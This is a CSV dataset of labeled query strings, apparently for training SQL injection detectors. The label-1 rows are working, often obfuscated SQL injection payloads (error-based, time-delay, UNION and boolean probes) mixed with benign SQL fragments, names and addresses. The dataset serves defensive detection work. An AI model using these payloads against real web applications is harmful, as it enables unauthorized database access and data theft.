Query,Label
1%27%20%20%29%20%20%20ANd%20updatexml%20%20%28%20%203393%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20SELeCt%20%20%20%28%20%20elt%20%20%28%20%203393%20%20%3D%20%203393%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C1161%20%20%29%20%20%20ANd%20%20%20%28%20%20%27ngxz%27%20%20%3D%20%20%27ngxz,1
3.45951E+14,0
"1%'/**//**/)/**//**//**/||/**/8421/**//**/ LIKE /**//**//**//**/(/**//**/select/**/count/**//**/(/**//**/*/**//**/)/**//**//**/from/**/generate_series/**//**/(/**//**/1,5000000/**//**//**/)/**//**//**//**/)/**//**//**//**/&&/**//**//**/(/**//**/'%'/**//**/ LIKE /**//**/'",1
"calle ponte vella s/n, 13e",0
torremoroso enrich,0
SELECT * FROM cotton,0
1'+ (/*!SeLEct*/'mxlb'/*!wHErE*/4900 =	4900,1
"-1235""/**//**//**/)/**//**//**//**/)/**//**//**//**/or/**/4144/**//**/ LIKE /**//**//**//**/(/**//**/select/**/upper/**//**/(/**//**/xmltype/**//**/(/**//**/chr/**//**/(/**//**/60/**//**/)/**//**/||chr/**//**/(/**//**/58/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/112/**//**/)/**//**/||chr/**//**/(/**//**/106/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||/**//**/(/**//**/select/**//**//**/(/**//**/case/**/when/**//**//**/(/**//**/4144/**//**/ LIKE /**//**/4144/**//**/)/**//**//**/then/**/1/**/else/**/0/**/end/**//**/)/**//**//**/from/**/dual/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/118/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/62/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/from/**/dual/**//**/)/**//**//**/and/**//**//**//**/(/**//**//**//**/(/**//**//**/""ahhz""/**/like/**/""ahhz",1
montorns de segarra,0
SELECT * FROM father WHERE related BETWEEN have09/01/1996or AND seed15/31/1996chicken,0
sEleCt/**//**//**/(/**//**/caSE/**/whEN/**//**//**/(/**//**/6652/**//**/=/**//**/1932/**//**/)/**//**//**/ThEn/**/6652/**/ELsE/**/6652*/**//**/(/**//**/sEleCt/**/6652/**/FrOM/**/information_schema.character_sets/**//**/)/**//**//**/ENd/**//**/)/**//**/#,1
cot reixach,0
hole@chicashumedas.at,0
"1%""/**//**/)/**//**//*!union*//*!all*//*!select*//*!null*/,/*!null*/,/*!null*/,/*!null*/#",1
39672063f,0
SELECT TOP 3 * FROM human WHERE could = 'pretty',0
"once septiembre, 95",0
SELECT below ( s )  FROM station SELECT thank FROM knowledge,0
graff@manzanilladevillafafila.iq,0
lehar,0
FROM  ( SELECT DISTINCT way FROM area ),0
1%'/**/	)   orderby1#,1
SELECT camp ( s )  FROM chose UNION,0
2639,0
SELECT TOP 50 PERCENT * FROM butter SELECT * FROM tribe FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM please,0
SELECT affect ( s FROM cover RIGHT JOIN,0
"SELECT rod, create, seldomFROM happily WHERE idea  IS NOT NULL",0
10702,0
"SELECT Employees.bound, COUNT ( Orders.thirdID )  AS mineralsFROM    ( OrdersINNER JOIN off ON Orders.theeID  =  Employees.minuteID )",0
"1,  (  caST   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sEleCt   (  CAse WhEn   (  7823  =  7823  )   tHen 1 Else 0 eND   )    )   ::teXT||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    As numeric   )    )",1
"-9954""   )    )    || 4144 LIKE (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144 LIKE 4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   &&    (    (   ""bifi"" LIKE ""bifi",1
SELECT AVG ( particular ) FROM group SELECT SUM ( wonderful ),0
SELECT * FROM diagram FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM recently,0
"-7731""   )    )    || make_set  (  2551 LIKE 4389,4389  )   &&    (    (   ""unly"" like ""unly",1
-5137/**//**/)/**//**//*!or*/9323/**//**/=/**//**/9323#,1
"SELECT heartID AS ID, dawn AS behavior FROM opposite",0
SELECT * FROM ocean 3,0
"1 ORelt  (	6272 = 	6272,slEeP	(  5	)	)",1
"-1869""/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/union/**/all/**/select/**/7122,7122,7122,7122,7122,7122,7122,7122,7122--",1
SELECT TOP 3 * FROM whether WHERE spend = 'space',0
"INSERT INTO south ( second, distant, exclaimed, exactly, wealth, sure )  VALUES  ( 'factor', 'bus'. arrive', 'lucky', 'on', 'nails', 'column' )",0
versteeg,0
19115,0
SELECT AVG ( Price ) FROM purpose,0
SELECT * FROM simply ORDER BY desk DESC,0
magaz de pisuerga,0
"1%' )	 	)	 )	 and3824LIKEbenchmark	( 5000000,md5(  0x76555642	) 	) 	 and	(	(	  ('%'LIKE'",1
"SELECT Orders.unlessrID, Employees.shown, Employees.teach FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.slightID ORDER BY Orders.tonightID",0
19127,0
"1""/**//**/)/**//**//**//*!OR*//**/8384/**//**/=/**//**//*!lIke*//**//**/(/**//**/'abcdefg',upper/**//**/(/**//**/hex/**//**/(/**//**/randomblob/**//**/(/**//**/500000000/2/**//**//**/)/**//**//**//**/)/**//**//**//**//**//**/)/**//**//**//**/)/**//**//**//**//*!ANd*//**//**//**/(/**//**/""vkqt""/**//**/=/**//**/""vkqt",1
"SELECT COUNT ( making ) , swimming FROM breakfast BY storm",0
FROM  ( SELECT DISTINCT roll FROM independent ),0
6.27383E+15,0
rechinido,0
SELECT hearing ( s )  FROM changing SELECT reach ( s ),0
"sElECt count  (  *  )  /*!fROM*/sysibm.systables/*!As*/t1,sysibm.systables/*!As*/t2,sysibm.systables/*!As*/t3/*!AnD*/   (    (     (  ""%""  =  """,1
SELECT Count ( * )  AS adult,0
"1  )   || updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  SELEct   (  elt  (  1808 LIKE 1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   &&   (  3294 LIKE 3294",1
bidaurreta,0
barreras de la bandera,0
16300,0
salter@quiromante.com.mg,0
SELECT observe ( s )  FROM peace UNION ALL,0
"sElEcT dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )  /*!FRom*/dual/*!aNd*/""ulfr""/*!LiKE*/""ulfr",1
28760,0
SELECT * FROM lead WHERE grandmother = 'zipper'  OR brought = 'having',0
nicole-meyer@creacionesdolcevita.us,0
-6400%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%204650%2C4650%2C4650--,1
rabascall,0
"sELEcT/**/SLEeP/**//**/(/**//**/5/**//**/)/**//**//**/anD/**/""oivc""/**/like/**/""oivc",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8774 )  ORDER BY meta_id ASC",0
1%27%20and%20extractvalue%20%20%28%20%207982%2Cconcat%20%20%28%20%200x5c%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%207982%20%20%3D%20%207982%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%27pphf%27%20%20%3D%20%20%27pphf,1
"INSERT INTO safety ( swam, alphabet, bean, character, blood, tree )  VALUES  ( 'pass', 'dropped'. verb', 'chapter', 'important', 'way', 'zebra' )",0
SELECT * FROM agree WHERE    NOT labor = 'action',0
SELECT * FROM just WHERE cave = 'twenty'  AND  ( baseball = 'volume' OR struggle = 'available' ),0
SELECT * FROM actually WHERE    NOT history = 'thus',0
"1""	) )		)anD exp 	( 	~( sElect*	frOM (	sElectconcat(0x7171706a71,	(	sElect(	elt(	8190 =	 8190,1	) ) 			)	,0x717a767a71,0x78 )	   )	x)	)		anD ( ( (	 ""bizm""=""bizm",1
"-2821""/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**//*!union*//**//*!all*//**//*!select*//**/3920,3920,3920,3920,3920,3920,3920#",1
"1 UniOn ALL sELecT nuLL,nuLL--",1
"SELECT * FROM behavior WHERE fur NOT IN  ( 'particles', 'term', 'boat' )",0
1%25%22/%2A%21or%2A/2367%20%20%3D%20%20%20%20%28%20/%2A%21select%2A/count%20%20%28%20%20%2A%20%20%29%20%20/%2A%21from%2A/rdb%24fields/%2A%21as%2A/t1%2Crdb%24types/%2A%21as%2A/t2%2Crdb%24collations/%2A%21as%2A/t3%2Crdb%24functions/%2A%21as%2A/t4%20%20%29%20%20--,1
SELECT * FROM salmon WHERE act = 'glad',0
"SELECT Employees.count, COUNT ( Orders.stepID )  AS fiftyFROM    ( OrdersINNER JOIN reason ON Orders.panID  =  Employees.signalID )",0
"SELECT needed AS duck, fire AS [automobile]  FROM throughout",0
"1/*!or*/4411/*!LIKE*/( /*!select*/count  (  *  )  /*!from*/sysusers/*!as*/sys1,sysusers/*!as*/sys2,sysusers/*!as*/sys3,sysusers/*!as*/sys4,sysusers/*!as*/sys5,sysusers/*!as*/sys6,sysusers/*!as*/sys7  )  -- ctdx",1
6a0ato,0
8322,0
1%22%20%20%29%20%20%20where%209570%20%20%3D%20%209570%20rlike%20%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%201642%20%20%3D%20%203686%20%20%29%20%20%20then%201%20else%200x28%20end%20%20%20%29%20%20%20%20%29%20%20%20--,1
1%22%20%20%29%20%20%20where%208153%20%20%3D%20%208153,1
SELECT TOP 50 PERCENT * FROM his,0
select/**/sleep/**//**/(/**//**/5/**//**/)/**//**//**/&&/**//**//**//**/(/**//**//**//**/(/**//**//**/'wyvx'/**//**/ LIKE /**//**/'wyvx,1
1%27%20%20%29%20%20%20and%202388%20%20%3D%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x6d457153%20%20%20%29%20%20%20%20%29%20%20%20%23,1
SELECT joy ( s )  FROM willing FULL OUTER JOIN,0
select%0C%2A%C2%A0from%0Busers%0Cwhere%C2%A0id%20LIKE%201%0Bor%0B%5C%2B%3C%24%C2%A0union%0Cselect%0C1%2C%40%40VERSION%0B--%0C1,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11406 )  ORDER BY meta_id ASC",0
FROM  ( SELECT DISTINCT rhyme FROM around ),0
SELECT * FROM bill WHERE cover NOT LIKE 'industry%',0
SELECT smooth ( s ) FROM stone INNER JOIN,0
26707809w,0
SELECT AVG ( against )  FROM caught  SELECT SUM ( pull ),0
"SELECT rock,pretty FROM fruit WHERE country = 'stared' UNION SELECT naturally, most FROM least",0
SELECT * FROM hung WHERE easily NOT LIKE '[bill]%',0
SELECT MIN ( box )  AS film FROM tie,0
SELECT Count ( * )  AS again,0
1%27%2B%0C%0C%28%0C%0Bselect%C2%A0ummn%09where%0B8883%0C%0C%3D%09%0B8883%09and%0B4241%0C%09%3D%0C%0Cconvert%09%09%28%09%C2%A0int%2C%0C%0B%28%09%0Cselect%0Bchar%C2%A0%0C%28%09%0B113%0B%0B%29%0B%09%2Bchar%0B%0B%28%09%0C113%09%C2%A0%29%0C%0C%2Bchar%0C%0B%28%0B%0B112%C2%A0%09%29%0C%0B%2Bchar%0C%09%28%C2%A0%0C106%C2%A0%0B%29%0B%0C%2Bchar%0C%0C%28%0B%0C113%0C%0C%29%C2%A0%0B%2B%C2%A0%0B%28%09%0Bselect%0C%09%0B%28%0B%0Bcase%0Cwhen%0B%0B%0C%28%0B%C2%A04241%09%C2%A0%3D%0C%094241%C2%A0%C2%A0%29%C2%A0%0B%0Bthen%09char%0B%0C%28%09%C2%A049%0C%C2%A0%29%09%C2%A0%0Belse%C2%A0char%0B%09%28%09%0B48%0B%0C%29%09%0C%0Cend%09%C2%A0%C2%A0%29%09%0C%0B%0B%29%C2%A0%09%0B%2Bchar%0B%09%28%0C%09113%09%09%29%0B%C2%A0%2Bchar%C2%A0%0C%28%0B%C2%A0122%0C%0B%29%C2%A0%0C%2Bchar%0B%0B%28%C2%A0%C2%A0118%C2%A0%C2%A0%29%C2%A0%C2%A0%2Bchar%09%C2%A0%28%0C%0B122%09%0B%29%0C%0B%2Bchar%0C%0C%28%C2%A0%0B113%C2%A0%0B%C2%A0%29%C2%A0%0B%0B%C2%A0%29%0B%0B%0B%0B%C2%A0%0C%29%0B%09%0B%C2%A0%29%C2%A0%09%C2%A0%2B%27,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20/%2A%21as%2A/hmyc/%2A%21where%2A/6732%20%20%3D%20%206732/%2A%21and%2A/exp%20%20%28%20%20~%20%20%28%20/%2A%21select%2A/%2A/%2A%21from%2A/%20%20%28%20/%2A%21select%2A/concat%20%20%28%20%200x7171706a71%2C%20%20%28%20/%2A%21select%2A/%20%20%28%20%20elt%20%20%28%20%208190%20%20%3D%20%208190%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20x%20%20%20%29%20%20%20%20%29%20%20%20--,1
trevetha,0
SELECT TOP 3 * FROM said,0
1%22%20%20%29%20%20%20as%20zuzm%20where%201211%20%20%3D%20%201211%20and%20elt%20%20%28%20%205458%20%20%3D%20%202966%2C2966%20%20%29%20%20--,1
"1""where3080 LIKE 3080|| 	(select2* 	(if ( (	select	*from(  select	concat	 (0x7171706a71,  (	select(	elt( 	8113 LIKE 8113,1	) 	 )	  ) 	,0x717a767a71,0x78  	)	 )	s) 	,8446744073709551610,8446744073709551610	)		 )  ) 	--",1
"select/**/count/**//**/(/**//**/*/**//**/)/**//**//**//*!from*//**/domain.domains/**//*!as*//**/t1,domain.columns/**//*!as*//**/t2,domain.tables/**//*!as*//**/t3/**//*!and*//**//**//**/(/**//**/'%'/**//**/=/**//**/'",1
"SELECT ProductName, UnitPrice *  ( UnitsInStock + ISNULL ( UnitsOnOrder, 0  )  )   FROM Products;",0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%20%20%20%28%20%20select%209173%20from%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%2Cconcat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%209173%20LIKE%209173%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20x%20from%20information_schema.character_sets%20group%20by%20x%20%20%29%20%20a%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27rdpv%27%20LIKE%20%27rdpv,1
"select/**/*/*!from*/users/*!where*/id/**//**/=/**//**/1/*!||*/"".,""/*!||*/1/**//**/=/**//**/1/**/--/**/1",1
"carretera ribas matama 160,",0
SELECT COUNT ( actual ) FROM neck,0
"(/**//**/select/**/*/**/from/**//**//**/(/**//**/select/**//**/(/**//**/sleep/**//**/(/**//**/5/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/srmq/**//**/)/**//**//**/&&/**//**//**//**/(/**//**//**//**/(/**//**//**//**//**/(/**//**/""eakt""/**/like/**/""eakt",1
SELECT DISTINCT language FROM horn,0
"SELECT * FROM judge ORDER BY means, flow",0
1%09where%C2%A06965%09LIKE%0C6965%09and%09elt%0C%0B%28%0C%0B3933%09LIKE%0C1232%2C1232%C2%A0%C2%A0%29%0B%C2%A0--,1
1%25%22%20or%204411%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20%20and%20%22%25%22%20%20%3D%20%20%22,1
"1%'/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/and/**/6510/**//**/=/**//**//**//**/(/**//**/select/**/count/**//**/(/**//**/*/**//**/)/**//**//**/from/**/sysusers/**/as/**/sys1,sysusers/**/as/**/sys2,sysusers/**/as/**/sys3,sysusers/**/as/**/sys4,sysusers/**/as/**/sys5,sysusers/**/as/**/sys6,sysusers/**/as/**/sys7/**//**/)/**//**//**/and/**//**//**//**/(/**//**//**//**/(/**//**//**//**//**/(/**//**/'%'/**//**/=/**//**/'",1
1%27%7C%7C%20%20%28%20%20select%20%27dpce%27%20from%20dual%20where%205261%20%20%3D%20%205261%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,1
"1""/**//**//**/)/**//**//**//**/)/**//**//**//**//**/(/**//**/SElect/**//**//**/(/**//**/cASe/**/when/**//**//**/(/**//**/5451/**//**/=/**//**/5451/**//**/)/**//**//**/tHen/**/regexp_substring/**//**/(/**//**/repeat/**//**/(/**//**/riGht/**//**/(/**//**/cHaR/**//**/(/**//**/5451/**//**/)/**//**/,0/**//**/)/**//**/,500000000/**//**/)/**//**/,null/**//**/)/**//**//**/eLSE/**/cHaR/**//**/(/**//**/108/**//**/)/**//**/||cHaR/**//**/(/**//**/76/**//**/)/**//**/||cHaR/**//**/(/**//**/112/**//**/)/**//**/||cHaR/**//**/(/**//**/116/**//**/)/**//**//**/eND/**//**/)/**//**//**/fRom/**/information_schema.system_users/**//**/)/**//**//**/aND/**//**//**//**/(/**//**//**//**/(/**//**//**/""uwdz""/**//**/=/**//**/""uwdz",1
DELETE FROM discuss WHERE cook = 'basic',0
SELECT * FROM advice WHERE question BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM settlers WHERE cloud BETWEEN '1996-07-01' AND '1996-07-31',0
1'/**//**/)/**//**//**/and/**/3715/**/in/**//**//**//**/(/**//**//**//**/(/**//**//**/char/**//**/(/**//**/113/**//**/)/**//**/+char/**//**/(/**//**/113/**//**/)/**//**/+char/**//**/(/**//**/112/**//**/)/**//**/+char/**//**/(/**//**/106/**//**/)/**//**/+char/**//**/(/**//**/113/**//**/)/**//**/+/**//**/(/**//**/select/**//**//**/(/**//**/case/**/when/**//**//**/(/**//**/3715/**/LIKE/**/3715/**//**/)/**//**//**/then/**/char/**//**/(/**//**/49/**//**/)/**//**//**/else/**/char/**//**/(/**//**/48/**//**/)/**//**//**/end/**//**//**/)/**//**//**//**/)/**//**//**/+char/**//**/(/**//**/113/**//**/)/**//**/+char/**//**/(/**//**/122/**//**/)/**//**/+char/**//**/(/**//**/118/**//**/)/**//**/+char/**//**/(/**//**/122/**//**/)/**//**/+char/**//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/and/**//**//**/(/**//**/'uwbt'/**/like/**/'uwbt,1
roldan,0
(/**//**/select/**//**//**/(/**//**/case/**/when/**//**//**/(/**//**/9263/**//**/=/**//**/9263/**//**/)/**//**//**/then/**/1/**/else/**/9263*/**//**/(/**//**/select/**/9263/**/from/**/mysql.db/**//**/)/**//**//**/end/**//**//**/)/**//**//**//**/),1
SELECT * FROM circus WHERE salt = 'reach'  AND  ( beauty = 'mail' OR flower = 'slabs' ),0
DELETE FROM fewer,0
"-6305""/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//*!or*/8097/**//**/=/**//**/2048/*!and*//**//**//**/(/**//**//**//**/(/**//**//**//**//**/(/**//**/""euyy""/*!like*/""euyy",1
"SELECT valuable, dozen, importanceFROM curve WHERE statement  IS NOT NULL",0
"SELECT COUNT ( again ) , won FROM citizen BY thick",0
barco montull,0
SELECT * FROM body WHERE completely BETWEEN '1996-07-01' AND '1996-07-31',0
24768,0
admin'/*!oR*/1  =  1/*,1
SELECT somebody ( s )  FROM private SELECT future FROM state,0
"masia can giro, 5",0
SELECT * FROM orange FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT organized ( s )  FROM tribe,0
"INSERT INTO little  ( air, slowly, movie )  VALUES  ( 'pressure', 'search', 'classroom' )",0
1%27%20%20%29%20%20%20rlike%20sleep%20%20%28%20%205%20%20%29%20%20%20and%20%20%20%28%20%20%27tslp%27%20%20%3D%20%20%27tslp,1
1%27%20%20%29%20%20%20and%20row%20%20%28%20%206237%2C7469%20%20%29%20%20%3E%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%2Cconcat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%206237%20%20%3D%20%206237%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20x%20from%20%20%20%28%20%20select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%20%20%29%20%20a%20group%20by%20x%20%20%29%20%20%20and%20%20%20%28%20%20%27qbdm%27%20%20%3D%20%20%27qbdm,1
1%20and%206537%20%20%3D%20%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%2076%20%20%29%20%20%7C%7Cchr%20%20%28%20%20116%20%20%29%20%20%7C%7Cchr%20%20%28%20%20117%20%20%29%20%20%7C%7Cchr%20%20%28%20%2065%20%20%29%20%20%2C5%20%20%29,1
"-9672'/**/	 ) )	asrupb where	8218 LIKE 8218ormake_set	(4954 LIKE 1836,1836  ) --",1
SELECT path ( s )  FROM handsome SELECT chapter ( s ),0
p44m8scu6916n,0
-2527/**//**//**/)/**//**//**//**/)/**//**//**//**/as/**/oqpy/**/where/**/7468/**/LIKE/**/7468/**/or/**/3038/**/LIKE/**/3038,1
1%27%2B%0C%0C%28%0C%09select%C2%A0%27phtz%27%0Cwhere%C2%A03171%0C%0C%3D%0C%C2%A03171,1
1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20/%2A%21AND%2A/%20%20%28%20/%2A%21sELeCt%2A/2%2A%20%20%28%20%20if%20%20%20%28%20%20%20%20%28%20%20/%2A%21sELeCt%2A/%2A/%2A%21FROm%2A/%20%20%28%20/%2A%21sELeCt%2A/concat%20%20%28%20%200x7171706a71%2C%20%20%28%20/%2A%21sELeCt%2A/%20%20%28%20%20elt%20%20%28%20%203484%20%20%3D%20%203484%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20s%20%20%29%20%20%2C%208446744073709551610%2C%208446744073709551610%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20/%2A%21AND%2A/%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%209401%20%20%3D%20%209401,1
"SELECT Orders.showrID, Employees.flew, Employees.something FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.officeID ORDER BY Orders.thoseID",0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%20%29%20%20%20%20%29%20%20%20%2B%27,1
"-2948'   )    )   /*!OR*/make_set  (  9354  =  9354,7185  )  /*!anD*/   (    (   'ivwt'  =  'ivwt",1
"SELECT PERIOD_DIFF ( 1703, 1612 ) ;",0
"-9829' )	)  )oR1gROuPBY concat 	(	0x7171706a71,( SelecT 	(	CASE	wHEN		( 	4232	=	4232 	) tHeN 1 ElsE0 END )		),0x717a767a71,floor	(	rand		( 0)  *2	 )	 )	haViNGmin	( 	0 ) #",1
"SELECT * FROM plastic WHERE rich BETWEEN ""low"" AND    ""aloud""",0
"1'/**//**/)/**//**//**/UNiOn/**/ALL/**/SeLect/**/Null,Null,Null--",1
75512816k,0
"1/**//**//**/)/**//**//**//**/)/**//**//**//**/as/**/cdhd/**/where/**/2958/**/LIKE/**/2958/**/||/**/5356/**/LIKE/**/(/**//**/select/**/count/**//**/(/**//**/*/**//**/)/**//**//**/from/**/sysusers/**/as/**/sys1,sysusers/**/as/**/sys2,sysusers/**/as/**/sys3,sysusers/**/as/**/sys4,sysusers/**/as/**/sys5,sysusers/**/as/**/sys6,sysusers/**/as/**/sys7/**//**/)/**//**/--",1
"1' )	 unionallselect	null,null,null,null,null,null,null,null,null,null#",1
"1%""   )    )     )   rlike SLeEp  (  5  )  #",1
SELECT * FROM claws FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM why,0
consalve,0
SELECT * FROM steep  WHERE start NOT LIKE '[met]%',0
"1""	 ) wHEre 9499	=9499",1
"1""  )   AS duvm WheRe 6190 LIKE 6190 oRdeR bY 1--",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367845 )  ORDER BY meta_id ASC",0
5.67192E+14,0
SELECT * FROM bus WHERE question NOT LIKE '[having]%',0
alcoleja,0
mirambell donet,0
madan deluca,0
1'  )  /*!where*/8575  =  8575/*!&&*/3715/*!in*/   (    (  /*!char*/ (  113  )  +/*!char*/ (  113  )  +/*!char*/ (  112  )  +/*!char*/ (  106  )  +/*!char*/ (  113  )  +  ( /*!select*/  ( /*!case*//*!when*/  (  3715  =  3715  )  /*!then*//*!char*/ (  49  )  /*!else*//*!char*/ (  48  )  /*!end*/  )    )   +/*!char*/ (  113  )  +/*!char*/ (  122  )  +/*!char*/ (  118  )  +/*!char*/ (  122  )  +/*!char*/ (  113   )    )     )  --,1
SELECT laugh ( s )  FROM earth,0
1%27%2B%20%20%28%20%20select%20%27qaar%27%20where%207841%20LIKE%207841%20or%205286%20LIKE%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20%20%20%29%20%20%20%20%29%20%20%20%2B%27,1
"SELECT street AS corner, business AS [beauty]  FROM climb",0
herminia,0
SELECT * FROM language FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM  ( SELECT remove FROM community ),0
1%22/%2A%21or%2A/%09%0B%28%0B/%2A%21select%2A/2%2A%0B%0C%28%09%09if%09%0C%C2%A0%28%0C%C2%A0%09%09%28%C2%A0%C2%A0/%2A%21select%2A/%2A/%2A%21from%2A/%09%0B%28%0C/%2A%21select%2A/concat%0C%09%28%0C%0B0x7171706a71%2C%0C%C2%A0%28%09/%2A%21select%2A/%09%09%28%09%0Celt%C2%A0%0B%28%0C%C2%A08113%0C%C2%A0%3D%0B%098113%2C1%C2%A0%C2%A0%C2%A0%29%0B%0B%09%C2%A0%29%0C%0B%C2%A0%0B%0B%29%0B%0C%2C0x717a767a71%2C0x78%C2%A0%0B%09%29%C2%A0%09%0C%09%29%C2%A0%0B%C2%A0s%09%09%29%0B%C2%A0%2C%098446744073709551610%2C%098446744073709551610%0C%0B%09%29%09%0C%C2%A0%C2%A0%29%0B%0C%C2%A0%0C%09%29%C2%A0%C2%A0/%2A%21and%2A/%22oyou%22%0B%0C%3D%0B%0C%22oyou,1
